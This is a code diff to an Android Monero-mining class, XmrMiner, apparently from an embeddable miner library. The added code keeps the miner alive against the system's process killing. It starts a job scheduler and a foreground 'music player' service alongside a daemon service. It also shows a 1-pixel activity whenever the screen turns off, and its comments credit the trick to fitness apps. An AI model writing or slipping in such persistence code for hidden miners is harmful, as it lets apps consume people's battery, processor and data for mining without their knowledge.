@@ -14,7 +14,12 @@ import java.io.ObjectStreamException;
 
 import waterhole.miner.core.MinerInterface;
 import waterhole.miner.core.WaterholeMiner;
-import waterhole.miner.core.keepAlive.DaemonEnv;
+import waterhole.miner.core.utils.LogUtils;
+import waterhole.miner.monero.keepappalive.receiver.ScreenReceiverUtil;
+import waterhole.miner.monero.keepappalive.service.DaemonService;
+import waterhole.miner.monero.keepappalive.service.PlayerMusicService;
+import waterhole.miner.monero.keepappalive.utils.JobSchedulerManager;
+import waterhole.miner.monero.keepappalive.utils.ScreenManager;
 
 import static waterhole.miner.core.utils.LogUtils.errorWithReport;
 import static waterhole.miner.core.utils.LogUtils.info;
@@ -46,6 +51,33 @@ public final class XmrMiner extends WaterholeMiner {
         }
     };
 
+    // 1像素Activity管理类
+    private ScreenManager mScreenManager;
+
+    private ScreenReceiverUtil.SreenStateListener mScreenListenerer = new ScreenReceiverUtil.SreenStateListener() {
+        @Override
+        public void onSreenOn() {
+            // 亮屏，移除"1像素"
+            mScreenManager.finishActivity();
+        }
+
+        @Override
+        public void onSreenOff() {
+            // 接到锁屏广播，将SportsActivity切换到可见模式
+            // "咕咚"、"乐动力"、"悦动圈"就是这么做滴
+//            Intent intent = new Intent(SportsActivity.this,SportsActivity.class);
+//            startActivity(intent);
+            // 如果你觉得，直接跳出SportActivity很不爽
+            // 那么，我们就制造个"1像素"惨案
+            mScreenManager.startActivity();
+        }
+
+        @Override
+        public void onUserPresent() {
+            // 解锁，暂不用，保留
+        }
+    };
+
     public boolean isMining() {
         return mServiceBinder != null;
     }
@@ -68,10 +100,21 @@ public final class XmrMiner extends WaterholeMiner {
     @Override
     public MinerInterface init(Context context) {
         MinerInterface minerInterface = super.init(context);
-        // 需要在 Application 的 onCreate() 中调用一次 DaemonEnv.initialize()
-        DaemonEnv.initialize(context, TraceServiceImpl.class, DaemonEnv.DEFAULT_WAKE_UP_INTERVAL);
-        TraceServiceImpl.sShouldStopService = false;
-        DaemonEnv.startServiceMayBind(TraceServiceImpl.class);
+        JobSchedulerManager jobManager = JobSchedulerManager.getJobSchedulerInstance(context);
+        jobManager.startJobScheduler();
+
+        ScreenReceiverUtil screenListener = new ScreenReceiverUtil(context);
+        mScreenManager = ScreenManager.getScreenManagerInstance(context);
+        screenListener.setScreenReceiverListener(mScreenListenerer);
+
+        LogUtils.info("start keep alive service");
+        // 3. 启动前台Service
+        Intent intent_0 = new Intent(context, PlayerMusicService.class);
+        context.startService(intent_0);
+        // 4. 启动播放音乐Service
+
+        Intent intent_1 = new Intent(context, DaemonService.class);
+        context.startService(intent_1);
         return minerInterface;
     }
 
